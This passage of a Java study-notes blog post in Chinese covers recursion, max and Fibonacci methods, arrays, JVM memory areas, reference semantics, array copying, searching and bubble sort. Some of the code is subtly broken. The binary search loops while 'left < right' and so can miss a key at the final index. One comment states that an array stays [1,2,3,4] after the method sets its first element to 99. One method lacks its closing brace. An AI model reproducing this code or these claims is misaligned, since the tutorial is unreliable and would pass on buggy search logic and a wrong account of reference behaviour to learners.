(a == <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(a);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        function(a - <span class="number">1</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        function(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求俩个整数的最大值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b ? a : b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 求三个数的最大值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> a</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> b</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> c</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max3</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> max2(a, b);</span><br><span class="line">        <span class="keyword">return</span> max &gt; c ? max : c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//重载写法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> max2(a, b);</span><br><span class="line">        <span class="keyword">return</span> ret &gt; c ? ret : c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fib</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fib</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">f3</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            f3 = f1 + f2;</span><br><span class="line">            f1 = f2;</span><br><span class="line">            f2 = f3;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">fib1</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span> || n == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> fib1(n - <span class="number">1</span>)  +  fib( n - <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(fib1(<span class="number">1</span>));</span><br><span class="line">        System.out.println(fib1(<span class="number">2</span>));</span><br><span class="line">        System.out.println(fib1(<span class="number">5</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组是有一种引用数据类型</p><h2 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arr</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr1.length; i++) &#123;</span><br><span class="line">            System.out.print(arr1[i] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">// 数组当中数据类型定义的变量  : 数组名 ，但拿不到数组下标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x: arr1) &#123;</span><br><span class="line">            System.out.print(x + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">        <span class="comment">//专门用来操作数组 Array 需要导入一个包</span></span><br><span class="line">        <span class="comment">//把数组转变为字符串，然后返回</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> Arrays.toString(arr1);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">double</span> arr1[] = <span class="keyword">new</span> <span class="title class_">double</span>[<span class="number">1</span>];<span class="comment">//0.0</span></span><br><span class="line">        <span class="type">float</span> arr2[] = <span class="keyword">new</span> <span class="title class_">float</span>[<span class="number">1</span>];<span class="comment">//0.0f</span></span><br><span class="line">        System.out.println(arr1[<span class="number">0</span>]);</span><br><span class="line">        System.out.println(arr2[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a1</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a3</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;a1, a2, a3&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;<span class="comment">//直接赋值</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;<span class="comment">//动态初始化</span></span><br><span class="line">        <span class="comment">//没有本质区别，只有写法上的区别.</span></span><br><span class="line">        <span class="type">int</span>[] arr4 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//分配空间，默认值0或0.0,boolean是false</span></span><br><span class="line">        System.out.println(arr4[<span class="number">1</span>]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr3.length;</span><br><span class="line">        System.out.println(arr[<span class="number">2</span>]);</span><br><span class="line">        System.out.println(len);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="数组（引用类型和应用场景）"><a href="#数组（引用类型和应用场景）" class="headerlink" title="数组（引用类型和应用场景）"></a>数组（引用类型和应用场景）</h2><p><img src="https://s2.loli.net/2023/06/04/KaNcYtfUGvEML1r.png" alt="image.png"></p><ul><li><p><em>程序计数器</em>（PC Register）：只是一个很小的空间，保存下一条执行的指令的地址</p></li><li><p><em>虚拟机栈</em>（JVM Stack）：与方法调用相关的一些信息，每个方法在执行时，都会先创建一个栈帧，栈帧中包含有：局部变量表、操作数栈、动态链接、返回地址以及其他的一些信息，保存的都是与方法执行时相关的一些信息。比如：局部变量。当方法运行结束后，栈帧就被销毁了，即栈帧中保存的数据也被销毁了。</p></li><li><p><em>本地方法栈</em>（Native Method Stack）：本地方法栈与虚拟机栈的作用类似.只不过保存的内容是Native方法的局部变量.在有些版本的JVM实现中（例如HotSpot），本地方法栈和虚拟机栈是一起的</p></li><li><p><em>堆</em>（Heap）：JVM所管理的最大内存区域．使用new 创建的对象都是在堆上保存（例如前面的 new int［］（1，2，31），堆是随着程序开始运行时而创建，随着程序的退出而销毁，堆中的数据只要还有在使用，就不会被销毁。</p></li><li><p><em>方法区</em>（Method Area）：用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据.方法编译出的的字节码就是保存在这个区域</p></li></ul><p>现在我们只简单关心堆和虚拟机栈这两块空间，后序JVM中还会更详细介绍。</p><p><img src="https://s2.loli.net/2023/06/04/XHIdJgRlSf8wWvZ.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Arr</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main7</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="literal">null</span>;<span class="comment">//引用对象的0值，代表这个引用不指向任何对象</span></span><br><span class="line">        <span class="comment">//System.out.println(arr[0]);没对象，哪来的长度,空指针异常</span></span><br><span class="line">        <span class="comment">//所以不能进行读写操作，否则抛出NullPointException</span></span><br><span class="line">        System.out.println(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main6</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="comment">//一个引用不能指向多个对象，但一个对象可以被多个引用指向</span></span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        arr = arr2; <span class="comment">//arr没了，此时没人引用&#123;1，2，3，4&#125;就自动回收了</span></span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[3, 4, 5, 7]</span></span><br><span class="line">        System.out.println(Arrays.toString(arr2));<span class="comment">//[3, 4, 5, 7]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] arr2 = arr;<span class="comment">//arr2这个引用指向了arr引用所引用的对象</span></span><br><span class="line">        arr2[<span class="number">1</span>] = <span class="number">99</span>;<span class="comment">//改arr2 arr也会变</span></span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1, 99, 3, 4]</span></span><br><span class="line">        System.out.println(Arrays.toString(arr2));<span class="comment">//[1, 99, 3, 4]</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr[i] = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组的应用场景"><a href="#数组的应用场景" class="headerlink" title="数组的应用场景"></a>数组的应用场景</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="comment">//System.out.println(Arrays.toString(arr));[0...0]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">99</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        func1(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1,2,3,4]</span></span><br><span class="line">        func2(arr);</span><br><span class="line">        System.out.println(Arrays.toString(arr));<span class="comment">//[1,2,3,4]</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/06/04/fK4B8Q6mEdYbo5N.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// int[] arr = &#123; 1, 2,3 ,4&#125;;//整体初始化只有一次机会！就是在定义的同时初始化；</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] array)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        array[<span class="number">0</span>] = array[<span class="number">1</span>];</span><br><span class="line">        array[<span class="number">1</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] tmp = &#123; <span class="number">1</span>, <span class="number">2</span>&#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;交换前： &quot;</span> + tmp[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + tmp[<span class="number">1</span>]);</span><br><span class="line">        swap(tmp);</span><br><span class="line">        System.out.println(<span class="string">&quot;交换后： &quot;</span>+ tmp[<span class="number">0</span>] + <span class="string">&quot; &quot;</span> + tmp[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] func3() &#123;<span class="comment">//返回一整个数组</span></span><br><span class="line">        <span class="type">int</span>[] tmp = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="keyword">return</span> tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ret = func3();</span><br><span class="line">        System.out.println(Arrays.toString(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>数组对象是在堆上的</li><li>引用变量目前是在main函数里面的，属于局部变量，当函数结束或就会被收回内存</li><li>是变量被回收后，对象没人引用了，自动回收了，fun函数里的地址和main函数里的地址不同，fun里的回收后，对象还在，但fun里有队arr的操作会保存下来，因为对象被改变了。</li></ol><h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><h4 id="数组转字符串"><a href="#数组转字符串" class="headerlink" title="数组转字符串"></a>数组转字符串</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">myToString</span><span class="params">(<span class="type">int</span>[] tmp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;[&quot;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tmp.length; i++) &#123;</span><br><span class="line">                ret = ret + tmp[i];</span><br><span class="line">                <span class="keyword">if</span> (i != tmp.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    ret += <span class="string">&quot;,&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ret = ret + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> myToString(array);</span><br><span class="line">        String ret2= myToString(arr2);</span><br><span class="line">        System.out.println(ret1);</span><br><span class="line">        System.out.println(ret2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>法二</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toString</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">iMax</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (iMax == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;[]&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        b.append(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>  ; ; i++) &#123;</span><br><span class="line">            b.append(arr[i]);</span><br><span class="line">            <span class="keyword">if</span> (i == iMax)</span><br><span class="line">                <span class="keyword">return</span> b.append(<span class="string">&#x27;]&#x27;</span>).toString();</span><br><span class="line">            b.append(<span class="string">&quot;, &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> toString(array);</span><br><span class="line">        String ret2= toString(arr2);</span><br><span class="line">        System.out.println(ret1);</span><br><span class="line">        System.out.println(ret2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="数组拷贝"><a href="#数组拷贝" class="headerlink" title="数组拷贝"></a>数组拷贝</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 =  arr;<span class="comment">//这不算拷贝，没有新的内存空间</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = <span class="keyword">new</span> <span class="title class_">int</span>[arr.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            arr3[i] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">        System.out.println(Arrays.toString(arr3));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>方法实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] arr2 = Arrays.copyOf(arr, arr.length);</span><br><span class="line">        System.out.println(Arrays.toString(arr2));</span><br><span class="line">        <span class="comment">//扩容2倍</span></span><br><span class="line">        <span class="type">int</span>[] arr3 = Arrays.copyOf(arr, arr.length * <span class="number">2</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr3));</span><br><span class="line">        </span><br><span class="line">        <span class="type">int</span>[] arr4 = Arrays.copyOfRange(arr, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        System.out.println(Arrays.toString(arr4));</span><br><span class="line">        <span class="type">int</span>[] arr5 = arr.clone();</span><br><span class="line">        System.out.println(Arrays.toString(arr5));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="求平均值"><a href="#求平均值" class="headerlink" title="求平均值"></a>求平均值</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">avg</span><span class="params">(<span class="type">int</span> arr[])</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> x : arr) &#123;</span><br><span class="line">            sum += x;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum * <span class="number">1.0</span> / arr.length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">2</span> ,<span class="number">3</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        System.out.println(avg(arr));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="找下标"><a href="#找下标" class="headerlink" title="找下标"></a>找下标</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">find1</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left + right) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (arr[mid] &lt; key) &#123;</span><br><span class="line">            left = mid + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arr[mid] &gt; key) &#123;</span><br><span class="line">            right = mid - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>, <span class="number">8</span> ,<span class="number">3</span>, <span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">    Arrays.sort(arr);<span class="comment">//快排,升序，降序需要比较器，没学;</span></span><br><span class="line">    <span class="comment">//也可以用Arrays.binarySearch()</span></span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">    System.out.println(binarySearch(arr, <span class="number">4</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="复习下冒泡"><a href="#复习下冒泡" class="headerlink" title="复习下冒泡"></a>复习下冒泡</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; len - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[j + <span class="number">1</span>];</span><br><span class="line">                    arr[j + <span class="number">1</span>] = arr[j];</span><br><span class="line">                    arr[j] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(Arrays.toString(arr));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>优化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">bubblesort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">flg</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; arr.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[j] &gt; arr[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[j];</span><br><span class="line">                arr[j] = arr[j +  <span class="number">1</span>];</span><br><span class="line">                arr[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                flg =<span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (flg == <span class="literal">false</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">   